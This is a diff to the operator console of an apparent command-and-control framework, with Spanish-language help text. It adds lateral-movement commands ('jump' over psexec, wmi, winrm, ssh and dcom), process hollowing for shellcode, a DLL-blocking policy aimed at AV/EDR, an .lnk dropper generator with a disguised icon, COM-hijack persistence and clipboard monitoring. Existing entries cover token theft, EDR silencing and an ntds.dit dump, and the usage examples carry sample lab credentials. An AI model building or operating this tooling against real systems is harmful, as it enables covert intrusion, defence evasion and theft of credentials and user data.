@@ -5052,10 +5052,12 @@ const AC_COMMANDS = [
   ['winrm exec','winrm exec <t> <u> <p> <cmd>'],
   ['winrm deploy','winrm deploy <t> <u> <p> <cradle>'],
   // ── Lateral movement (stage + exec in one shot) ──────────────────────────
-  ['lateral','lateral <psexec|wmi|winrm> <host> <payload.exe> [DOMAIN\\user] [pass]'],
-  ['lateral psexec', 'lateral psexec <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB admin$ + servicio SCM'],
-  ['lateral wmi',    'lateral wmi    <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB C$ + WMI Win32_Process'],
-  ['lateral winrm',  'lateral winrm  <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB C$ + Invoke-Command'],
+  ['jump','jump <psexec|wmi|winrm|ssh|dcom> <host> <payload.exe> [user] [pass]'],
+  ['jump psexec', 'jump psexec <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB admin$ + SCM service'],
+  ['jump wmi',    'jump wmi    <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB C$ + WMI Win32_Process'],
+  ['jump winrm',  'jump winrm  <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB C$ + Invoke-Command'],
+  ['jump ssh',    'jump ssh    <host> <payload.exe> <user> <pass>         — SCP upload + SSH exec (Linux targets)'],
+  ['jump dcom',   'jump dcom   <host> <payload.exe> [DOMAIN\\user] [pass] — SMB + MMC20.Application DCOM'],
   ['token-store steal','token-store steal <pid> — robar token de proceso y guardar en store'],
   ['token-store use','token-store use <id> — usar token del store'],
   ['token-store show','token-store show — listar tokens guardados'],
@@ -5077,6 +5079,17 @@ const AC_COMMANDS = [
   ['peb-spoof','peb-spoof <path> — enmascarar proceso en PEB (ej: C:\\Windows\\System32\\svchost.exe)'],
   ['hwbp-clear','hwbp-clear — limpiar hardware breakpoints del EDR'],
   ['ntds-dump','ntds-dump [outdir] — volcar ntds.dit vía ntdsutil (DA requerido)'],
+  // New features
+  ['hollow','hollow [target.exe] <shellcode.bin> — process hollowing (NtUnmapViewOfSection + inject + hijack)'],
+  ['blockdlls','blockdlls [on|off] — Microsoft-signed-only DLL policy (bloquea inyección de AV/EDR)'],
+  ['blockdlls on','blockdlls on — activar política firma Microsoft (BLOCKDLLS)'],
+  ['blockdlls off','blockdlls off — desactivar política firma Microsoft'],
+  ['gen-lnk','gen-lnk <target.exe> [args] <out.lnk> — generar dropper .lnk con icono camuflado'],
+  ['com-hijack','com-hijack <CLSID> <dll.dll> — hijack COM HKCU (sin admin, persiste en COM load)'],
+  ['com-hijack rm','com-hijack rm <CLSID> — eliminar hijack COM de HKCU'],
+  ['clip-monitor start','clip-monitor start [secs] — monitorizar portapapeles continuamente'],
+  ['clip-monitor dump','clip-monitor dump — recuperar entradas capturadas'],
+  ['clip-monitor stop','clip-monitor stop — detener monitor y volcar log'],
 ];
 
 // Commands only available on Windows agents — hidden from autocomplete on Linux agents
@@ -5094,7 +5107,10 @@ const AC_WIN_ONLY = new Set([
   'ishell','ishell cmd','ishell ps','ishell exit',
   'link start','link stop',
   'winrm exec','winrm deploy',
-  'lateral','lateral psexec','lateral wmi','lateral winrm',
+  'jump','jump psexec','jump wmi','jump winrm','jump ssh','jump dcom',
+  'hollow','blockdlls','blockdlls on','blockdlls off',
+  'gen-lnk','com-hijack','com-hijack rm',
+  'clip-monitor start','clip-monitor dump','clip-monitor stop',
   'token-store steal','token-store use','token-store show','token-store remove','token-store clear',
   'screenwatch start','screenwatch stop',
   'edr-silence','edr-silence-rm','eventlog-suspend','eventlog-resume',
@@ -5190,8 +5206,8 @@ function consoleAcUpdate() {
       // fall through to subcommand / hint suggestions
     }
 
-    // Lateral movement: file is 3rd arg — "lateral psexec <host> <partial>"
-    if (cmd === 'lateral') {
+    // Jump (lateral movement): file is 3rd arg — "jump psexec <host> <partial>"
+    if (cmd === 'jump') {
       const rest = val.slice(spaceIdx + 1);       // "psexec 10.7.10.22 age"
       const parts = rest.trimStart().split(' ');
       if (parts.length >= 3) {
@@ -6428,27 +6444,30 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'port-scan': taskType='PORT_SCAN'; taskArgs=args; break;
 
     // ── Lateral movement ───────────────────────────────────────────────────
-    // lateral <psexec|wmi|winrm> <host> <payload.exe> [DOMAIN\user] [pass]
-    case 'lateral': {
+    // jump <psexec|wmi|winrm|ssh|dcom> <host> <payload.exe> [user] [pass]
+    case 'jump': {
       const lp = args.trim().split(/\s+/);
       const lMethod = (lp[0] || '').toLowerCase();
-      if (!['psexec','wmi','winrm'].includes(lMethod) || lp.length < 3) {
+      const validMethods = ['psexec','wmi','winrm','ssh','dcom'];
+      if (!validMethods.includes(lMethod) || lp.length < 3) {
         addConsoleOutput(
-          'uso: lateral <método> <host> <payload.exe> [DOMAIN\\\\user] [pass]\n\n' +
+          'uso: jump <método> <host> <payload.exe> [user] [pass]\n\n' +
           'Métodos:\n' +
-          '  psexec  — copia via SMB admin$, ejecuta via SCM (service)\n' +
-          '  wmi     — copia via SMB C$,     ejecuta via WMI Win32_Process\n' +
-          '  winrm   — copia via SMB C$,     ejecuta via Invoke-Command\n\n' +
+          '  psexec  — SMB admin$ + SCM service (Windows → Windows)\n' +
+          '  wmi     — SMB C$ + WMI Win32_Process::Create\n' +
+          '  winrm   — SMB C$ + PowerShell Invoke-Command\n' +
+          '  dcom    — SMB + MMC20.Application DCOM ExecuteShellCommand\n' +
+          '  ssh     — SCP upload + SSH exec (Windows → Linux/Unix)\n\n' +
           'Ejemplos:\n' +
-          '  lateral psexec 10.7.10.22 agent.exe\n' +
-          '  lateral psexec 10.7.10.22 agent.exe NORTH\\\\eddard.stark FightP3aceAndHonor!\n' +
-          '  lateral wmi    10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
-          '  lateral winrm  10.7.10.22 agent.exe NORTH\\\\jon.snow iknownothing\n' +
-          '  lateral psexec 10.7.10.22 agent.exe  (usa token actual — ya debe haber privilegio)',
+          '  jump psexec 10.7.10.22 agent.exe\n' +
+          '  jump psexec 10.7.10.22 agent.exe NORTH\\\\eddard.stark FightP3aceAndHonor!\n' +
+          '  jump wmi    10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
+          '  jump dcom   10.7.10.22 agent.exe NORTH\\\\jon.snow iknownothing\n' +
+          '  jump ssh    192.168.1.50 implant.elf root r00tpass',
           '', null);
         return;
       }
-      taskType = 'LATERAL';
+      taskType = 'JUMP';
       taskArgs = JSON.stringify({
         method:  lMethod,
         host:    lp[1],
@@ -6456,6 +6475,104 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         user:    lp[3] || '',
         pass:    lp.slice(4).join(' ') || '',
       });
+      break;
+    }
+
+    // ── Process hollowing ──────────────────────────────────────────────────
+    // hollow [target.exe] <shellcode.bin>
+    case 'hollow': {
+      const hp = args.trim().split(/\s+/);
+      if (hp.length === 0 || hp[0] === '') {
+        addConsoleOutput(
+          'uso: hollow [target.exe] <shellcode.bin>\n\n' +
+          'Inyecta shellcode en un proceso nuevo vaciando su imagen original.\n\n' +
+          'Ejemplos:\n' +
+          '  hollow shellcode.bin                       (usa RuntimeBroker.exe por defecto)\n' +
+          '  hollow C:\\\\Windows\\\\System32\\\\notepad.exe shellcode.bin',
+          '', null);
+        return;
+      }
+      // If one arg: shellcode. If two: target + shellcode.
+      const hTarget = hp.length >= 2 ? hp[0] : '';
+      const hPayload = hp.length >= 2 ? hp[1] : hp[0];
+      taskType = 'HOLLOW';
+      taskArgs = hTarget;
+      // payload is the shellcode filename — server will load it
+      // We encode as JSON for target, payload via standard Payload field
+      taskArgs = JSON.stringify({target: hTarget, payload: hPayload});
+      break;
+    }
+
+    // ── Blocking DLL policy ────────────────────────────────────────────────
+    case 'blockdlls': {
+      const enable = args.trim().toLowerCase() !== 'off';
+      taskType = 'BLOCKDLLS';
+      taskArgs = enable ? 'on' : 'off';
+      break;
+    }
+
+    // ── LNK dropper generator ──────────────────────────────────────────────
+    // gen-lnk <target.exe> [args] <out.lnk>
+    case 'gen-lnk': {
+      const gp = args.trim().split(/\s+/);
+      if (gp.length < 2) {
+        addConsoleOutput(
+          'uso: gen-lnk <target.exe> [cmd_args] <out.lnk>\n\n' +
+          'Genera un archivo .lnk (Windows Shell Link) que apunta a target.\n\n' +
+          'Ejemplos:\n' +
+          '  gen-lnk C:\\\\Windows\\\\System32\\\\cmd.exe /c agent.exe C:\\\\Users\\\\Public\\\\doc.lnk\n' +
+          '  gen-lnk C:\\\\Temp\\\\agent.exe "" C:\\\\Users\\\\Public\\\\report.lnk',
+          '', null);
+        return;
+      }
+      const glTarget = gp[0];
+      const glOut = gp[gp.length - 1];
+      const glArgs = gp.slice(1, -1).join(' ');
+      taskType = 'GEN_LNK';
+      taskArgs = JSON.stringify({target: glTarget, args: glArgs, outfile: glOut});
+      break;
+    }
+
+    // ── COM Hijacking ──────────────────────────────────────────────────────
+    // com-hijack <CLSID> <dll.dll>  |  com-hijack rm <CLSID>
+    case 'com-hijack': {
+      const cp = args.trim().split(/\s+/);
+      if (cp[0] === 'rm' && cp.length >= 2) {
+        taskType = 'COM_HIJACK';
+        taskArgs = 'rm ' + cp[1];
+      } else if (cp.length >= 2) {
+        taskType = 'COM_HIJACK';
+        taskArgs = JSON.stringify({clsid: cp[0], dll: cp[1]});
+      } else {
+        addConsoleOutput(
+          'uso: com-hijack <CLSID> <dll.dll>\n     com-hijack rm <CLSID>\n\n' +
+          'Planta HKCU\\\\CLSID hijack (no requiere admin).\n\n' +
+          'CLSIDs comunes:\n' +
+          '  {9BA05972-F6A8-11CF-A442-00A0C90A8F39}  ShellWindows (Explorer)\n' +
+          '  {1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}  MruPidlList',
+          '', null);
+        return;
+      }
+      break;
+    }
+
+    // ── Clipboard monitor ──────────────────────────────────────────────────
+    case 'clip-monitor': {
+      const sub = args.trim().split(/\s+/)[0];
+      if (sub === 'start') {
+        const interval = parseInt(args.trim().split(/\s+/)[1]) || 5;
+        taskType = 'CLIP_MONITOR_START';
+        taskArgs = String(interval);
+      } else if (sub === 'dump') {
+        taskType = 'CLIP_MONITOR_DUMP';
+        taskArgs = '';
+      } else if (sub === 'stop') {
+        taskType = 'CLIP_MONITOR_STOP';
+        taskArgs = '';
+      } else {
+        addConsoleOutput('uso: clip-monitor start [secs] | dump | stop', '', null);
+        return;
+      }
       break;
     }
 
